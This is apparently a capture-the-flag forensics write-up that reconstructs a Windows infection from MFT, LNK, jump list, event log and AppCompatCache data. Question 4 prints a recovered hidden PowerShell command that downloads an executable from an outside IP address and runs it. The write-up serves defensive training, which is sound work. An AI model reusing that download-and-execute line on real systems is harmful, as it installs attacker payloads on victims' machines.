# Solution

1. What is the earliest time of infection?

The flag format is `SSS{yyyy-MM-dd-hh:mm:ss}`

``` bash
# we check the MFT and find a suspicious invoice file
# the first time it was dropped as a .zip at Created0x10 2026-07-08 15:29:45
Line	Tag	Entry Number	Sequence Number	Parent Entry Number	Parent Sequence Number	In Use	Parent Path	File Name	Extension	Is Directory	Has Ads	Is Ads	File Size	Created0x10	Created0x30	Last Modified0x10	Last Modified0x30	Last Record Change0x10	Last Record Change0x30	Last Access0x10	Last Access0x30	Zone Id Contents	Reparse Target	Reference Count	SI<FN	u Sec Zeros	Copied
139170	Unchecked	79751	8	31203	3	Checked	.\Users\systemid\Downloads	invoice_4471.zip	.zip	Unchecked	Checked	Unchecked	314	2026-07-08 15:29:45		2026-07-08 15:29:47	2026-07-08 15:29:45	2026-07-08 15:29:47	2026-07-08 15:29:46	2026-07-08 15:39:54	2026-07-08 15:29:46			1	Unchecked	Unchecked	Unchecked
# we reconstruct the flag
SSS{2026-07-08-15:29:45}
```

2. When did the victim first interact with the actual payload?

The flag format is `SSS{yyyy-MM-dd-hh:mm:ss}`

``` bash
# we check the LECmd
# we find an invoice_4771.js file
# we extract its LNK Source Created Timestamp
Line	Tag	Source File	Source Created	Source Modified	Source Accessed	Target Created	Target Modified	Target Accessed	File Size	Relative Path	Working Directory	File Attributes	Header Flags	Volume Serial Number	Drive Type	Volume Label	Network Path	Common Path	Local Path	Arguments	Target ID Absolute Path	Target MFT Entry Number	Target MFT Sequence Number	Machine ID	Machine MAC Address	MAC Vendor	Tracker Created On	Extra Blocks Present
9	Unchecked	E:\red\C\Users\systemid\AppData\Roaming\Microsoft\Windows\Recent\invoice_4471 (2).lnk	2026-07-08 15:31:02	2026-07-08 15:39:50	2026-07-07 23:00:00	2026-07-08 17:00:42	2026-07-08 15:39:43	2026-07-08 15:39:49	262	..\..\..\..\..\Downloads\invoice_4471\invoice_4471.js	C:\Users\systemid\Downloads\invoice_4471	FileAttributeArchive	HasTargetIdList, HasLinkInfo, HasRelativePath, HasWorkingDir, IsUnicode, DisableKnownFolderTracking	BCF1A6C7	Fixed storage media (Hard drive)				C:\Users\systemid\Downloads\invoice_4471\invoice_4471.js		Downloads\\	0x33BAD	0x4	test	00:0c:29:61:85:be	VMWARE	2026-07-08 14:26:53	TrackerDataBaseBlock, PropertyStoreDataBlock
# we reconstruct the flag
SSS{2026-07-08-15:31:02}
```

3. What was used to execute the payload?

The flag format is `SSS{AppIdDescription}`

``` bash
# we check the AutomaticDestinations csv in FileFolderAccess
# we find the invoice_4771.js file
# we extract its AppIdDescription column hinted in the flag format
Line	Tag	Source File	Source Created	Source Modified	Source Accessed	App Id	App Id Description	Dest List Version	Last Used Entry Number	MRU	Entry Number	Creation Time	Last Modified	Hostname	Mac Address	Path	Interaction Count	Pin Status	File Birth Droid	File Droid	Volume Birth Droid	Volume Droid	Target Created	Target Modified	Target Accessed	File Size	Relative Path	Working Directory	File Attributes	Header Flags	Drive Type	Volume Serial Number	Volume Label	Local Path	Common Path	Target ID Absolute Path	Target MFT Entry Number	Target MFT Sequence Number	Machine ID	Machine MAC Address	Tracker Created On	Extra Blocks Present	Arguments	Notes
6	Unchecked	E:\red\C\Users\systemid\AppData\Roaming\Microsoft\Windows\Recent\AutomaticDestinations\9f5c7755804b850a.automaticDestinations-ms	2026-07-08 15:31:02.0500000	2026-07-08 15:39:50.0000000	2026-07-07 23:00:00.0000000	9f5c7755804b850a	Windows Script Host - wscript.exe (64-bit)	6	1	0	1	2026-07-08 14:26:53.2334941	2026-07-08 15:39:49.5004688	test	00:0c:29:61:85:be	C:\Users\systemid\Downloads\invoice_4471\invoice_4471.js	2	False	10ba555d-7ad9-11f1-8166-000c296185be	10ba555d-7ad9-11f1-8166-000c296185be	54bba9da-b3a1-4a36-bc13-bbdaa613782e	54bba9da-b3a1-4a36-bc13-bbdaa613782e	2026-07-08 17:00:42.0000000	2026-07-08 15:30:30.0846029	2026-07-08 15:31:01.9858366	262			FileAttributeArchive	HasTargetIdList, HasLinkInfo, IsUnicode, DisableKnownFolderTracking, AllowLinkToLink	Fixed storage media (Hard drive)	BCF1A6C7		C:\Users\systemid\Downloads\invoice_4471\invoice_4471.js		My Computer\C:\Users\\Downloads\\	0x156BB	0x6	test	00:0c:29:61:85:be	2026-07-08 14:26:53.2334941	TrackerDataBaseBlock, PropertyStoreDataBlock	
# we reconstruct the flag
SSS{Windows Script Host - wscript.exe (64-bit)}
```

4. What is the commandline that downloaded the second stage?

The flag format is `SSS{"full" -command line}`

``` bash
# we check the evtx csv
# we filter by event id 4688 for new processes
# we filter the Executable Info by wscript, as found earlier
# we find one at Time Created 2026-07-08 15:31:02, around our execution timeline
Line	Tag	Record Number	Event Record Id	Time Created	Event Id	Level	Provider	Channel	Process Id	Computer	User Id	Map Description	User Name	Remote Host	Payload Data1	Payload Data2	Payload Data3	Payload Data4	Payload Data5	Payload Data6	Executable Info	Source File	Payload	Keywords	Hidden Record
74177	Unchecked	8231	8231	2026-07-08 15:31:02	4688	LogAlways	Microsoft-Windows-Security-Auditing	Security	4	test		A new process has been created	test\systemid		Parent process: C:\Windows\System32\wscript.exe	PID: 0x2824	Parent PID: 0x2590	Mandatory label: SECURITY_MANDATORY_MEDIUM_RID	Target User: -\-		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -NoP -W Hidden -C "IWR http://192.168.181.160/updates/svchost-update.exe -OutFile $env:TEMP\svchost-update.exe; Start-Process $env:TEMP\svchost-update.exe"	E:\red\C\Windows\System32\winevt\logs\Security.evtx	{"EventData":{"Data":[{"@Name":"SubjectUserSid","#text":"S-1-5-21-3757327896-2532397730-150904874-1002"},{"@Name":"SubjectUserName","#text":"systemid"},{"@Name":"SubjectDomainName","#text":"test"},{"@Name":"SubjectLogonId","#text":"0x137CEF"},{"@Name":"NewProcessId","#text":"0x2824"},{"@Name":"NewProcessName","#text":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"},{"@Name":"TokenElevationType","#text":"%%1938"},{"@Name":"ProcessId","#text":"0x2590"},{"@Name":"CommandLine","#text":"\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -NoP -W Hidden -C \"IWR http://192.168.181.160/updates/svchost-update.exe -OutFile $env:TEMP\\svchost-update.exe; Start-Process $env:TEMP\\svchost-update.exe\""},{"@Name":"TargetUserSid","#text":"S-1-0-0"},{"@Name":"TargetUserName","#text":"-"},{"@Name":"TargetDomainName","#text":"-"},{"@Name":"TargetLogonId","#text":"0x0"},{"@Name":"ParentProcessName","#text":"C:\\Windows\\System32\\wscript.exe"},{"@Name":"MandatoryLabel","#text":"S-1-16-8192"}]}}	Audit success	Unchecked
# we extract the commandline from the Executable Info field
SSS{"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -NoP -W Hidden -C "IWR http://192.168.181.160/updates/svchost-update.exe -OutFile $env:TEMP\svchost-update.exe; Start-Process $env:TEMP\svchost-update.exe"}
```

5. What directory was the second stage dropped into?

The flag format is `SSS{\pa\th\}`

``` bash
# we extract the directory from the ProgramExecution, AppCompatCache csv
Line	Tag	Control Set	Duplicate	Cache Entry Position	Executed	Last Modified Time UTC	Path	Source File
11	Unchecked	1	Unchecked	10	NA	2026-07-08 15:39:54	C:\Users\systemid\AppData\Local\Temp\svchost-update.exe	E:\red\C\Windows\System32\config\SYSTEM
# we reconstruct the flag
SSS{C:\Users\systemid\AppData\Local\Temp\}
```
